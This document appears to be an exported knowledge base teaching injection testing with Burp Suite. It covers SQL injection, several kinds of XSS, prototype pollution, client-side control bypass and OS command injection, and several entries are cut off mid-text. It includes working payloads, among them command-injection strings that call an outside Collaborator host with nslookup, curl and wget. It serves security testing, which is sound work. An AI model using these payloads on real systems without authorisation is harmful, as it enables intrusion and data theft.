entries.title: Testing input validation (overview)
entries.body:
# Testing input validation

A huge part of web vulnerabilities boils down to one root: an application accepts data from the user and handles it as trusted - it does not validate, does not escape, does not coerce it to the expected format. An attacker uses this, slipping into parameters not what is expected there, but a specially crafted payload that "breaks out" of the context (an SQL query, an HTML page, an OS command, an XML parser, a file path) and changes the logic of operation. This section is the entry point into the group of injection vulnerabilities: further on, each topic is dissected on a separate page.

## Which bug classes belong here

The Burp documentation places the following classes under input validation testing:

* **SQL injection** - interference with database queries.
* **Cross-site scripting (XSS)** - injecting JavaScript that executes in the victim's browser (reflected / stored / DOM-based).
* **Client-side prototype pollution** - polluting `Object.prototype` on the client side.
* **OS command injection** - executing OS commands on the server.
* **XXE injection** - abusing the processing of external XML entities.
* **Directory traversal** - reading arbitrary files via a path bypass (`../`).
* **Bypassing client-side controls** - bypassing checks performed only on the client side.

## What you test with in Burp

There is no single "find all injections" button - each class has its own tool, and in real work they are combined:

* **Proxy** - interception and editing of requests, searching for reflections in **HTTP history**. The starting point of almost any test: it is from here that the request goes to Repeater/Intruder.
* **Repeater** - the manual loop "changed the request -> sent it -> looked at the response". The main tool for a targeted check of a single parameter and selecting a payload by context.
* **Intruder** - automatic brute force: running lists of payloads (fuzzing) over the marked positions with analysis of the status/length/time of the response. Indispensable for enumeration (which tags/characters pass the filter) and for time-based checks.
* **Scanner** (Professional) - automatic searching via **Do active scan**; findings land in **Dashboard > Issues**.
* **Collaborator** (Professional) - an external channel (OAST) for blind vulnerabilities: blind SQLi, blind XXE, asynchronous command injection, blind XSS.
* **DOM Invader** - hunting for client-side bugs (DOM XSS, web message XSS, prototype pollution) right in the built-in browser.

## The general working principle

Practically any injection test is built on one scheme:

```
1. Catch a request with a user parameter in Proxy.
2. Send it to Repeater (manual dissection) or Intruder (brute force).
3. Slip a payload specific to the bug class into the parameter
   (a quote for SQLi, < > for XSS, ; for command injection, ../ for traversal).
4. Assess the reaction: a DB error, a reflection in HTML, a delay, new data,
   a change in response length - or an incoming interaction on Collaborator.
5. Confirm and assemble a reproducible PoC.
```

Next - in detail by each class: which exact characters and techniques work, where to insert them, and how to read the result.

entries.title: Bypassing client-side controls
entries.body:
# Bypassing client-side controls

A frequent development mistake is relying on checks that are performed only in the browser: hidden form fields, the `disabled`/`readonly` attributes, length restriction via `maxlength`, dropdown lists with a fixed set of values, JavaScript validation before submission. The logic "the user cannot change this anyway" is false: the client is entirely under the attacker's control. Any such check can be bypassed if you intercept and edit the request after the browser has formed it - that is, in **Proxy**.

## The basic scenario: editing an intercepted request

```
1. Proxy > Intercept, the toggle in the "Intercept on" position.
2. In Burp's browser perform an action on the page
   (submit a form, click "Buy", save a setting).
3. Burp will intercept the request - it appears on the Intercept tab.
4. Find the interesting parameter: a hidden field, a price, a role, a flag,
   a value that could not be changed in the UI.
5. Edit the value right in the interception window.
6. Click Forward - the modified request will go to the server.
7. Check the result: either in the live application, or by the response.
```

A classic example from a learning lab: a purchase form hides a field with the item's price. In the interface it is invisible and cannot be changed, but in the intercepted request it sits in plain text - we change it, for example, to `1` (or `0.01`), forward it, and the server accepts the order at our price, because it trusted the sent value.

## What to look for in the request

* **Hidden fields (`<input type="hidden">`)** - prices, item identifiers, discounts, `userId`, `role`, `isAdmin`, state tokens.
* **Client-locked fields** - what was `disabled`/`readonly` in the form: their value may still go into the request (or it can be added manually).
* **Length restriction** - `maxlength` cuts input in the browser, but in the intercepted request you insert a string of any length.
* **Fixed options** - a `<select>` with three items does not stop you from sending a fourth, "unforeseen" value.
* **JS validation** - format checks (email, phone, "digits only") often live only in the script; in Proxy you send whatever you want, bypassing them.

## More convenient in Repeater

If you need to check many variants of the same parameter, do not keep intercept on. Send the request to **Repeater** (right-click the request in **HTTP history** or the node in **Target > Site map** -> **Send to Repeater**) and there calmly change the value and hit **Send** as many times as you like, observing the response.

```http
POST /cart HTTP/2
Host: shop.example.com
Content-Type: application/x-www-form-urlencoded

productId=2&price=1&quantity=1&redir=PRODUCT
```

## How to notice that a request was modified

In **Proxy > HTTP history** there is an **Edited** column - it marks requests that you edited by hand. This helps in a large log to quickly separate the "live" modified requests from ordinary traffic and return to them when writing the report.

## Practical notes

* **Look at hidden and server-side fields first.** The most frequent finding is a price/discount/identifier that the application blindly trusts.
* **Check the server-side re-verification.** The essence of the bug is that there is no repeated validation on the server. If the server does recompute the price/rights - there is no bypass, record it as "correct".
* **Do not limit yourself to visible fields.** Sometimes a parameter is not sent by the browser at all, but the server accepts it (mass assignment) - try adding `isAdmin=true`, `role=admin` by hand.
* **Combination with other bugs.** Having bypassed the client-side length/format, you also open the path for SQLi/XSS - the client-side validation was often the only "filter".

entries.title: SQL injection (overview)
entries.body:
# SQL injection

**SQL injection (SQLi)** is a vulnerability in which user input, without proper handling, lands right in the text of an SQL query, and an attacker gains the ability to interfere with the logic of this query to the database. If the application builds the query by string concatenation, then the inserted special characters (first and foremost a single quote) "break out" of the string literal, and from there you can append your own conditions and SQL constructs.

## What this gives the attacker

* **Reading other people's data** - extract from the DB what the application should not show: accounts, password hashes, personal data, the contents of neighboring tables.
* **Modifying and deleting data** - modify or wipe records (UPDATE/DELETE/INSERT), breaking integrity.
* **Authentication bypass** - the classic `' OR '1'='1` in the login form.
* In severe cases - going beyond the DB (reading/writing files, executing commands) depending on the DBMS and the privileges.

## Types of SQLi (important for choosing a testing technique)

* **In-band (visible)** - the result is visible right in the response: either through the DB error text (**error-based**), or by mixing your own rows into the output (**UNION-based**).
* **Blind** - there are neither data nor an error in the response, but the behavior changes:
  * **Boolean-based** - the response differs for a "true/false" condition.
  * **Time-based** - the response is delayed if you inject a delay function (`SLEEP`, `WAITFOR DELAY`, `pg_sleep`).
* **Out-of-band (OAST)** - there are no data in the response, but the DB can be forced to initiate an external interaction (for example, DNS resolution of a subdomain), which **Collaborator** catches.

## What you test with in Burp

The documentation offers two paths, and both are useful:

* **Scanner** (Professional) - automatic searching: on a request you do **Do active scan**, view the findings in **Dashboard > Issues**. Quickly covers many parameters.
* **Intruder** - manual fuzzing: you mark a suspicious parameter as a position and run a list of SQL payloads over it (Pro has a built-in **Fuzzing - SQL injection**), analyzing the responses.
* **Repeater** - a targeted manual check of a single parameter: substitute a quote, look at the error, assemble a UNION or a boolean check.

Detailed steps are on the "Testing for SQL injection" page.

entries.title: Testing for SQL injection
entries.body:
# Testing for SQL injection

There are two working approaches: an automatic scan (fast, Professional) and manual fuzzing via Intruder + a check in Repeater (works in any edition and gives full control). In practice they are combined.

## Automatic scan (Professional)

```
1. Proxy > HTTP history - find the target request with a parameter.
2. Right-click > Do active scan (or Scan).
3. View the results in Dashboard > Issues - there will be
   confirmed SQL injection with details and proof.
```

## Manual fuzzing via Intruder

```
1. In the request select the value of the tested parameter.
2. Right-click > Send to Intruder.
3. On the Intruder tab check that position markers § stand around
   the parameter (or set Add §).
4. In the Payloads panel load a list of payloads:
   - Pro: Add from list > Fuzzing - SQL injection;
   - Community: add the strings manually (see below).
5. Start attack.
6. In the results table sort by Status / Length /
   response time and look for anomalies.
```

What to look at in the results:

* **a different status or text** - a DB error appeared, or on the contrary "welcome back" where there used to be a refusal;
* **a changed length (Length)** - a sign that the payload changed the selection;
* **a response delay** - a time-based payload fired (see below).

## Manual check in Repeater

For targeted work **Repeater** is more convenient: right-click the request > **Send to Repeater**, then substitute one payload at a time and hit **Send**.

The first and main test is a single quote. If it breaks the syntax, a DBMS error will surface in the response:

```
'
```

Next - a "true/false" check (boolean) and a bypass check:

```sql
' OR '1'='1
' OR 1=1-- -
" OR 1=1-- -
) OR 1=1-- -
```

In a numeric context the quote is not needed:

```
1 OR 1=1
1 AND 1=2
```

If there is no visible response, **time-based** payloads are used - by the response delay it is clear that an injection exists (the syntax depends on the DBMS):

```sql
-- MySQL
' AND SLEEP(10)-- -
' OR IF(1=1,SLEEP(10),0)-- -
-- PostgreSQL
'; SELECT pg_sleep(10)-- -
-- MSSQL
'; WAITFOR DELAY '0:0:10'-- -
-- Oracle
' AND 1=(SELECT 1 FROM dual WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE('a',10))-- -
```

An example request in Repeater (the parameter in the URL):

```http
GET /products?category=Gifts'+AND+SLEEP(10)--+- HTTP/2
Host: app.example.com
```

## Useful payloads for a manual list (Community)

```
'
''
`
")
'))
' OR '1'='1
' OR 1=1-- -
' AND '1'='2
admin'-- -
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
```

## Practical notes

* **Start with the quote.** A single `'` and a meaningful DB error in the response is already a strong signal. Compare the response to `'` and to `''` (two quotes often "fix" the syntax back).
* **Did not find error-based - go to time-based.** Blind SQLi is caught precisely by the delay; in Intruder enable the response time column and compare.
* **Payload processing for UNION.** Selecting the number of columns in UNION is convenient to automate with a list of varying numbers of `NULL`.
* **OAST for the truly blind.** If there is neither output nor a delay - force the DB to reach out to **Collaborator** (DNS) and confirm the injection by the external interaction.

entries.title: Cross-site scripting XSS (overview)
entries.body:
# Cross-site scripting (XSS)

**Cross-site scripting (XSS)** is a vulnerability that lets an attacker get a vulnerable site to return malicious JavaScript to the victim's browser. This script executes in the context of the victim site, that is, with its rights: it can steal cookies/tokens, perform actions on behalf of the user, replace page content, intercept input. The root of the bug is the same as with other injections: user input, without proper escaping, lands in an HTML/JS context and is interpreted as code rather than text.

## Three types of XSS

* **Reflected XSS** - the payload arrives in the request and is immediately returned in the response of the same page. The attack requires the victim to follow a prepared link. Tested via **Repeater**: we look at whether the input is reflected and in what context.
* **Stored XSS** - the payload is saved on the server (a comment, a profile, a name) and is executed later for everyone who opens the page with this data. The most dangerous. Tested with the combination of Proxy (inject and find where it surfaces) + Repeater.
* **DOM-based XSS** - a vulnerability entirely on the client side: JS takes data from a source (`location.hash`, `postMessage`, etc.) and puts it into a dangerous sink (`innerHTML`, `eval`) without handling. The server has nothing to do with it. Tested in the browser with **DOM Invader**.

## How Burp helps

* **Proxy / Repeater** - find the reflection of the input and select a payload to fit the specific context (HTML body, attribute, JS string).
* **Intruder** - enumerate which tags and attributes/event handlers pass the filter (for bypassing sanitizers).
* **DOM Invader** - automatic tracing of source -> sink for DOM XSS and web message XSS right in the built-in browser.
* **Collaborator** - detection of **blind XSS**: the payload fires somewhere out of sight (in the admin panel), and the fact of firing is visible from an external request to your address.

Further dissected: finding reflected input, DOM XSS via DOM Invader, web message XSS, manual reflected XSS, stored XSS, filter bypass, and blind XSS - each topic on a separate page.

entries.title: Finding reflected input
entries.body:
# Finding reflected input Before building an XSS payload, you need to understand a simple thing: does your input get back into the response at all and, if so, into what place in the HTML it goes. "Reflected input" is a value from the request that the server returns unchanged (or almost unchanged) in the response body. This is the basic reconnaissance before reflected XSS, but it is useful for other bugs too. ## The idea: a unique marker string (canary) To reliably find a reflection, a deliberately unique, non-randomly-occurring string - a canary - is substituted into the parameter. By it you can then easily search in the response. The documentation uses as an example a simple label like `xsstest`; in practice it is better to take something even more unique (for example, `zzqx1337`), so there are no false matches with the ordinary text of the page. ## Manual search via Repeater ``` 1. Proxy > HTTP history - right-click the request > Send to Repeater. 2. Replace the value of the parameter being checked with a marker, for example xsstest. 3. Click Send. 4. In the response panel open the search (the search bar under the response) and enter xsstest - Repeater will highlight all occurrences. 5. Repeat for EACH request parameter in turn. ``` Example: ```http GET /search?q=xsstest HTTP/2 Host: app.example.com ``` If the response contains `...

Results for the query: xsstest

...` - the input is reflected in the HTML body. And if `......` - it is inside an attribute, and the exploitation context will be different. ## Why look specifically at the context The mere fact of reflection is half the job. What is decisive is **where** the marker landed, because that determines which characters are needed to break out of the context: * **in HTML text** - you need `<` for a new tag (`

entries.title: Finding DOM XSS via DOM Invader
entries.body: # Finding DOM XSS via DOM Invader DOM-based XSS lives entirely on the client side: vulnerable JavaScript takes data from an attacker-controlled source and, without handling, passes it to a dangerous sink. Finding such a bug by hand is hard - you need to read and mentally trace minified JS. **DOM Invader** does this automatically: it highlights the sinks that your input flows into and immediately shows the injection context. ## Preparation DOM Invader is preinstalled in the built-in **Burp's browser**, but is off by default (see the separate page about enabling it). In brief: launch Burp's browser, in the top right corner click the Burp logo, on the **DOM Invader** tab flip the toggle and click **Reload**. ## Search steps ``` 1. In Burp's browser open the target page. 2. Right-click the page > Inspect (or F12) - DevTools opens. 3. Switch to the DOM Invader tab among the DevTools tabs. 4. Click Copy canary to copy the marker string. 5. Paste the canary into potential sources: the values of URL parameters, form fields, the fragment (#...), and so on. 6. Study the augmented DOM view: it will show the sinks that the canary flowed into. ``` ## Accelerators: Inject URL params and Inject forms Pasting the marker into each parameter by hand is slow, so there are two buttons: * **Inject URL params** - reloads the page, automatically appending the canary to all query parameters. * **Inject forms** - inserts the canary into all form fields on the page. This is the fastest way to "spray" all the obvious sources at once and see which ones reach the sinks. ## Reading the results For each sink DOM Invader shows not only the fact of the hit, but also the context, which determines the exploitability: * **the sink type** - HTML (`innerHTML`) or JS (`eval`, `setTimeout`, `Function`); * a column with the value/surroundings - what exactly stands around the canary (which markup you ended up in); * the frame in which it happened (important for sites with iframes). The sinks are sorted by "interestingness" - the most promising for XSS at the top. ## The Stack Trace column - a jump into the code Clicking the link in the **Stack Trace** column takes you to the right line of the client-side code on the browser's **Sources** tab. This is critical when there is a filter/condition between the source and the sink: you see the real data path and understand what to bypass. ## Assembling the payload Having understood the context, you select a payload to fit it. An example of a check via the URL fragment: ``` https://target.example.com/#name= ``` If the canary surfaced in `innerHTML`, we check execution: ```html ``` If the sink is a JS context (`eval`/`Function`), the payload is built not on a tag, but on breaking the JS expression. DOM Invader highlighted the path - the final payload you assemble to fit the specific context. ## Practical notes * **The hash is especially valuable.** Parameters in the fragment (`#...`) do not go to the server - the bug is purely client-side, and it is not visible to "server-side" tools. * **Separate reflection from exploitability.** The canary may land in a dozen places, but dangerous are only the sinks where the context allows breaking out. * **Minified code is about Stack Trace.** Jumping into Sources saves hours instead of reading the bundle by hand. * **Not working - check Reload.** The most frequent reason for an empty view is forgetting to reload the page after enabling.

entries.title: DOM XSS via web messages (postMessage)
entries.body: # DOM XSS via web messages (postMessage) `postMessage()` is the standard way of exchanging messages between windows and frames of different origins. The bug arises when the `message` event handler trusts the arriving data or poorly verifies the `origin`: then data from a foreign window reaches a dangerous sink and gives DOM XSS. **DOM Invader** is able to intercept such messages, probe the handlers by itself, let you edit and resend messages, and assemble a PoC. ## Preparation DOM Invader must be enabled in **Burp's browser**. Additionally you need to enable message interception: in the DOM Invader settings activate **Postmessage interception** and click **Reload**. ## Steps ``` 1. In Burp's browser open the target page, right-click > Inspect, switch to the DOM Invader tab. 2. On the right choose the Messages view - that is where the intercepted messages collect, including ones marked as potentially vulnerable. 3. While dissecting a message, check how the handler reads: - origin - if there is no check, this is an indicator of a vulnerability; - data - if data is not used at all, there is no exploitation; - source - the absence of a check is also suspicious. 4. Click the message - a dialog with the details opens. 5. Edit the Data field, substituting a payload to fit the sink type. 6. Click Send - the modified message will go to the handler again. 7. If it worked, click Build PoC - DOM Invader will generate HTML (copied to the clipboard) for reproduction and the report. ``` ## How DOM Invader probes the handlers By default it does not just listen, but itself sends test messages to all the found `message` handlers, modifying them in two ways: * **injects a canary into `data`** - to track whether a controlled value reaches a dangerous sink; * **substitutes the `origin`** with a fake domain that fits the expected pattern - this catches faulty validation (for example, a check of "does the origin contain `trusted.com`", which `trusted.com.evil.com` passes). To suspicious messages it itself assigns a severity and a confidence - by these it is convenient to set priorities. ## Payload examples If `data` goes directly into `innerHTML`: ```js // in the Data field of the message dialog ``` If the handler expects JSON and, for example, a `url` field for a redirect is taken from it: ```json {"type":"redirect","url":"javascript:alert(document.domain)"} ``` ## Practical notes * **Provoke a message exchange.** Walk the application: widgets, OAuth pop-ups, embedded iframes, chats - these are precisely what initiate postMessage. * **A weak origin check is the most frequent bug.** The auto-substitution of origin finds it without manual fiddling. * **data -> innerHTML is a direct path to XSS.** A canary in `data` that surfaced in an HTML sink will immediately show this. * **JSON handlers.** The **Data** field can be rewritten into the needed structure; also JSON over postMessage is a vector for client-side prototype pollution (see the corresponding section).

entries.title: Manual testing of reflected XSS
entries.body: # Manual testing of reflected XSS When reflected input is found (see the reflected input page), the next step is to check whether it is handled safely on the server, and if not - to assemble a payload that actually executes. The main tool here is **Repeater**: the loop "substituted a payload -> Send -> looked at the response" with tuning to fit the specific context. ## The basic steps ``` 1. Send the request with the reflected input to Repeater (right-click > Send to Repeater). 2. Note where exactly your input lands and in what context (HTML body, attribute, JS) - the payload depends on this. 3. In the response panel enable auto-scroll: "> Auto scroll when text changes" - to see the changes. 4. Replace the marker with a test XSS payload, for example: 5. Click Send and compare the response - Burp will highlight the differences; look at how exactly your payload landed (whether it is encoded). 6. If the payload is filtered/encoded - select a different one to fit the context and repeat. 7. Check execution in the browser: right-click the request > Show response in browser, copy the URL and open it in Burp's browser - the alert should fire. ``` ## The payload to fit the context The main idea: there is no universal payload, it depends on where the input landed. * **HTML body** - the classics work: ```html

entries.title: Testing stored XSS
entries.body:
# Testing stored XSS

Stored XSS is when an application saves untrusted input (a comment, a name, a profile, a review) and later serves it to other users without handling. The payload executes for everyone who opens the page with this data. The difficulty of the test is that the input point and the output point are different places: first you have to find where exactly the saved value surfaces.

## Step 1. Find the input and output points

```
1. Proxy > Intercept (or simply walk the site with traffic
   interception enabled in HTTP history).
2. In the places where data is saved (a comment form, a profile,
   settings), substitute a unique marker instead of ordinary text.
3. Forward / send the request.
```

## Step 2. Track where the value surfaces

```
1. Proxy > HTTP history - click the filter bar.
2. In the Filter by search term field enter your unique marker.
3. Apply - only the responses containing the marker remain.
4. Review the matches: this way you find all the pages/responses
   where the saved value is displayed (the output points).
```

## Step 3. Check with a payload via Repeater

Usually two requests are needed - the one that saves and the one that displays. It is convenient to keep them side by side and run them in order.

```
1. Right-click the "save" request > Send to Repeater.
2. Likewise send the "display" request to Repeater.
3. Group the tabs: right-click the tab >
   Add tab to group > Create tab group.
4. Arrange the tabs so the input request goes BEFORE the output.
5. In the input request replace the marker with a payload, for example:
   <script>alert(1)</script>
6. In the dropdown menu of the Send button choose
   Send group in sequence (separate connections) -
   first the payload is saved, then the output page is pulled.
```

## Step 4. Confirm execution

```
1. On the response of the "display" request right-click >
   Show response in browser.
2. Copy the URL, open it in Burp's browser.
3. If the alert popped up - stored XSS is confirmed.
```

An example of a pair of requests:

```http
POST /post/comment HTTP/2
Host: blog.example.com
Content-Type: application/x-www-form-urlencoded

postId=3&comment=<script>alert(document.domain)</script>&name=t&email=t@t.io
```

```http
GET /post?postId=3 HTTP/2
Host: blog.example.com
```

## Practical notes

* **The marker first, the payload later.** First, with a harmless unique string, find ALL the output points (one value may surface in several places with a different context), and only then strike with the payload.
* **The output context decides.** As in reflected, the payload is selected to fit the place (body/attribute/JS) - see manual reflected XSS.
* **Send group in sequence is the key to reproducibility.** It guarantees the correct "saved -> displayed" order with a single action.
* **Stored is often = blind.** If the output is accessible only to a privileged user (the admin panel), move on to blind XSS via Collaborator.

entries.title: Bypassing XSS filters
entries.body: # Bypassing XSS filters Often the input is reflected, but the "head-on" payload `` does not fire: on the path stands a filter or sanitizer that cuts some tags/attributes and lets others through. The task is to figure out what exactly is allowed and assemble a working payload from the permitted. For enumeration **Intruder** is the most convenient: it quickly runs lists of tags and attributes and, by the response, shows what passed. ## Step 1. Enumerate the allowed tags ``` 1. Request with reflected input: right-click in HTTP history > Send to Intruder. 2. Replace the parameter value with <> and put the cursor between the brackets, then Add § - the payload position will be inside the tag. 3. In the Payloads panel (Payload configuration) add a list of tag names to check (from the XSS cheat sheet): script, img, svg, iframe, body, details, video, audio, a, math, marquee, ... 4. Start attack. 5. In the results: status 200 - the tag passed the filter, 400 - blocked. This way you get a list of the allowed tags. ``` ## Step 2. Enumerate the allowed attributes/handlers ``` 1. Take a tag that passed in step 1, and build a position around the attribute spot: (Add § where the attribute goes). 2. In Payloads click Clear and load a list of attribute names and event handlers (from the XSS cheat sheet): onload, onerror, onfocus, onmouseover, onpointerover, autofocus, src, href, ... 3. Start attack. 4. Responses with status 200 show the allowed attributes/events. ``` ## How to read the results The main criterion is the **response status** (200 versus 400) or whether the tag/attribute is reflected in the response without being stripped. In the results table sort by **Status** and/or compare **Length**: the variants that passed stand out. Additionally you can hang a grep rule (the attack settings tab), to automatically mark the responses where the payload was reflected in full. ## Assembling the payload from the permitted Having an "allowed tag + allowed handler", you assemble a working vector. Examples of combinations that often pass where `

entries.title: Blind XSS via Collaborator
entries.body: # Testing blind XSS Blind XSS is a variety of stored XSS in which the output point is inaccessible to you: the payload is saved and executed somewhere you have no access to (a typical example - the admin panel, ticket viewing by support, a log viewer). Nothing is visible in the response to your request, and the bug cannot be confirmed by ordinary methods. The solution is to make the payload, when triggered, perform an external request to **Collaborator**: an interaction arrived - that means the script executed somewhere. ## Steps ``` 1. The request that saves your input: right-click > Send to Repeater. 2. In the parameter form an XSS payload that loads an external script from your Collaborator domain. 3. In the place where the Collaborator address should be, right-click > Insert Collaborator payload (Burp will substitute a unique subdomain). 4. Send. 5. Switch to the Collaborator tab (it blinks on a new interaction) and check the table - interactions may arrive with a delay (when the admin opens the page). ``` ## A payload example The idea is to inject a ` ``` Where `.oastify.com` is the generated Collaborator address. ## Why specifically an external channel Blind XSS has no visible response by definition. The only reliable signal is that the victim's browser (for example, the admin's), when rendering your payload, reached out to your address. Even a single incoming **HTTP** (a request for the script) or **DNS** to your unique subdomain proves execution - and also gives a PoC with a timestamp and an IP. ## Practical notes * **A unique payload for each field.** Place different Collaborator addresses in different input points - by the subdomain that fired you immediately know which field and where "shot off". * **Wait with a margin.** Firing depends on when the victim opens the page; keep Collaborator open, during active checking hit Poll now. * **Load a script, not just an alert.** You will not see the `alert()` anyway; the point of a blind test is the external request, so the payload must pull a resource from Collaborator. * **The context still matters.** If you know where the input is saved, tune the vector to fit it; if not - take a "context-resilient" payload, as in the example above.

entries.title: Client-side prototype pollution
entries.body:
# Client-side prototype pollution

**Prototype pollution** is a JavaScript vulnerability in which an attacker adds or redefines properties in `Object.prototype` via specially crafted input (keys like `__proto__`, `constructor`, `prototype`). Since almost all objects inherit from `Object.prototype`, a "planted" property surfaces across the whole application. The pollution itself is half the job: to get impact (usually XSS) you need a **gadget** - a place in the code that reads this property and passes it to a dangerous sink. **DOM Invader** automates both phases.

## Enabling

```
1. In Burp's browser click the Burp Suite logo in the top right
   corner and switch to the DOM Invader tab.
2. Flip the DOM Invader toggle to the on position.
3. Click Attack types and enable Prototype pollution.
4. Click Reload.
```

## Finding sources

After reloading DOM Invader, besides the ordinary DOM XSS sources, starts looking for prototype pollution sources. The typical ones are URL parameters (first and foremost `location.hash` and the query) and JSON that arrived via `postMessage`. Walk the site and look at the **Sources** list on the DOM Invader tab - the discovered entry points will appear there (often with a description of alternative techniques on the same source).

## Confirming a source: Test

```
1. Choose a found source and click Test.
2. DOM Invader will open a new tab and try, via this
   source, to add an arbitrary property to Object.prototype.
3. Check: did the planted property appear on a new
   (empty) object - that is, does the prototype really get polluted.
```

What the PoC vector itself looks like in the URL fragment:

```
https://target.example.com/#__proto__[foo]=bar
https://target.example.com/#constructor[prototype][foo]=bar
```

If after such input `({}).foo` returns `bar` - the prototype is polluted, the source is confirmed.

## Finding a gadget: Scan for gadgets

```
1. Next to the confirmed source click Scan for gadgets.
2. DOM Invader will open a new tab and launch an auto-scan:
   it looks for a property that can be controlled via pollution,
   and that goes into a sink without sanitization.
3. The results are in the Sinks list in that tab.
```

## A ready exploit: Exploit

When a gadget is found, next to the sink in the **Sinks** list click **Exploit** - DOM Invader will assemble a PoC, combining source + gadget + sink. A successful `alert()` confirms exploitability.

## Practical notes

* **The full cycle at once.** The chain **Test -> Scan for gadgets -> Exploit** goes from "a parameter in the hash controls the prototype" to a ready XSS almost without manual code.
* **Gadgets are often in libraries.** `$.extend`, template engines, config builders - the auto-scan finds them, even if you do not know their internals.
* **JSON over postMessage is a separate vector.** A `__proto__` key inside the received JSON pollutes the prototype; DOM Invader checks this source automatically (overlap with web messages).
* **Without a gadget - usually low severity.** For the report aim to attach the chain "source -> gadget -> sink" from the **Exploit** button, not just the fact of pollution.
* **Is `__proto__` filtered?** Try `constructor[prototype]` and the alternative techniques hinted by DOM Invader.

entries.title: OS command injection (overview)
entries.body:
# OS command injection

**OS command injection** is a vulnerability that lets an attacker execute arbitrary operating system commands on the server where the application runs. It arises when an application builds a shell command string from user input and passes it to a system call without proper handling (a ping to the entered host, file conversion by an external utility, an export via a system command, etc.). The inserted shell metacharacters let you "append" your own command to the legitimate one.

## Why it is dangerous

This is one of the heaviest bugs: successful exploitation usually means code execution on the server, and that means full compromise of the application and its data. An attacker can read and modify files, move into the internal network, escalate privileges, establish persistence. The root, as with other injections, is insufficient input validation.

## Types (they determine the testing technique)

* **With direct output** - the command's result is visible in the response. Tested in **Repeater**: we inject a command and read its output right in the response.
* **Blind / asynchronous** - there is no output in the response, the command may run with a delay and in a different process. Confirmed only via an external channel - we force the server to make a network call (DNS/HTTP) to **Collaborator**.
* **With exfiltration via OAST** - even without direct output, the command's data can be "carried out" through Collaborator DNS subdomains.

## What you test with in Burp

* **Repeater** - the main tool: substitute a command separator and a payload, look at the output or the delay.
* **Intruder** - brute force of different separators/payloads over a parameter, analysis of the response time for time-based checks.
* **Collaborator** (Professional) - mandatory for blind and asynchronous command injection and for data exfiltration.
* **Scanner** (Professional) - automatic **Do active scan** for an initial search.

Further in three pages: basic testing (with output), asynchronous command injection via Collaborator, and data exfiltration via DNS.

entries.title: Testing for OS command injection
entries.body:
# Testing for OS command injection

This is about the case where the injection has a direct response - the command's output gets into the response (or changes it observably). The main tool is **Repeater**.

## The basic steps

```
1. Proxy > HTTP history - right-click the request > Send to Repeater.
2. On the Repeater tab substitute into the parameter a test payload
   with a command separator and a marker command.
3. Send.
4. In the response look for the command's output (for example, the username).
5. Check all request parameters in turn.
```

The simplest check from the documentation is to append `|whoami` to the value: if the OS username appeared in the response, the command executed.

```http
GET /feedback?email=test%40test.io|whoami HTTP/2
Host: app.example.com
```

## Command separators

To "append" your own command to the original, shell metacharacters are used. It is worth going through different ones - which one works depends on how exactly the command is built and which shell it is:

```
;        command1 ; command2     (execute both, Unix)
|        command1 | command2     (the output of the first into the second)
||       command1 || command2    (the second, if the first failed)
&        command1 & command2     (background execution)
&&       command1 && command2    (the second, if the first succeeded)
`cmd`    substitution of the result   (Unix)
$(cmd)   substitution of the result   (Unix)
%0a      line break               (sometimes works as a separator)
```

Variants of test payloads:

```
; whoami
| whoami
& whoami
&& whoami
`whoami`
$(whoami)
%0awhoami
```

## When there is no output - time-based

If no direct output is visible in the response, but there is a suspicion, it is checked by the delay - you inject a command that "puts the server to sleep" for N seconds. A noticeably grown response time confirms execution:

```
; ping -c 10 127.0.0.1
| ping -n 10 127.0.0.1        (Windows)
& sleep 10 &
`sleep 10`
$(sleep 10)
```

An example in Repeater (look at the response time at the bottom of the panel):

```http
GET /ping?host=127.0.0.1%3Bsleep+10 HTTP/2
Host: app.example.com
```

This same technique is convenient to automate in **Intruder**: mark the position, run a list of separators+`sleep`, and sort the results by the response time.

## Practical notes

* **Go through the separators.** One site reacts to `;`, another only to `|` or to the line break `%0a` - do not stop at the first one.
* **`whoami` as a marker.** Short, safe, with predictable output - ideal for initial confirmation.
* **No output - move on to the delay.** `ping`/`sleep` and control of the response time reveal the blind variant (and then - Collaborator).
* **Account for the OS.** `ping -c` (Unix) vs `ping -n` (Windows); substitution via backticks/`$()` - only the Unix shell.

entries.title: Asynchronous OS command injection (Collaborator)
entries.body:
# Asynchronous OS command injection

Asynchronous (essentially blind) command injection is when the injection exists, but the command runs asynchronously: its result does not get into the response, and the command itself may run later and in a different process (for example, queued for processing). You will see neither output nor a predictable delay in the current response. The only reliable way to confirm execution is to force the command to make a network call outward and catch it on **Collaborator** (OAST).

## Steps

```
1. Proxy > HTTP history - find the request to check.
2. Right-click > Send to Repeater.
3. In the parameter form a payload that triggers DNS resolution
   of a Collaborator subdomain - usually via nslookup.
4. In the address spot right-click > Insert Collaborator payload
   (Burp will substitute a unique subdomain).
5. Send.
6. Switch to the Collaborator tab, click Poll now.
7. In the table look for a DNS- (or HTTP-) interaction with your
   subdomain. The command may have run with a delay -
   the Collaborator tab blinks on a new interaction.
```

## Payload examples

The main working technique is `nslookup` of a Collaborator subdomain (outbound DNS is almost always allowed, even when HTTP is closed):

```
; nslookup <collab>.oastify.com
| nslookup <collab>.oastify.com
& nslookup <collab>.oastify.com &
`nslookup <collab>.oastify.com`
$(nslookup <collab>.oastify.com)
```

Alternatives, if you need specifically an HTTP call:

```
; curl http://<collab>.oastify.com
| wget http://<collab>.oastify.com
; ping -c 1 <collab>.oastify.com
```

An example request in Repeater:

```http
POST /feedback HTTP/2
Host: app.example.com
Content-Type: application/x-www-form-urlencoded

name=test&email=x%40x.io%7Cnslookup+<collab>.oastify.com&message=hi
```

Here `<collab>.oastify.com` is what is substituted via **Insert Collaborator payload**.

## Why DNS is the most sensitive signal

Often the system first resolves the name (DNS), and only then connects. Outbound HTTP may be closed by a firewall, while DNS resolution is not. So a single **DNS** interaction to your unique subdomain is weighty proof that the command executed, even if HTTP never arrived.

## Practical notes

* **Insert Collaborator payload instead of manual copying.** Each time a fresh unique subdomain - you will not confuse which field fired.
* **Wait and hit Poll now.** Asynchrony means a delay; do not conclude "not vulnerable" right away - give it time and poll manually.
* **Go through the separators.** As in ordinary command injection, `;`, `|`, `&`, backticks, or `$()` may work - combine them with `nslookup`.
* **Different subdomains for different parameters.** From the incoming interaction the guilty field is immediately visible.
* **The next step is exfiltration.** Having confirmed an asynchronous injection, you can carry out the command's output through DNS subdomains (see the separate page).

entries.title: Data exfiltration via OS command injection
entries.body:
# Data exfiltration via OS command injection

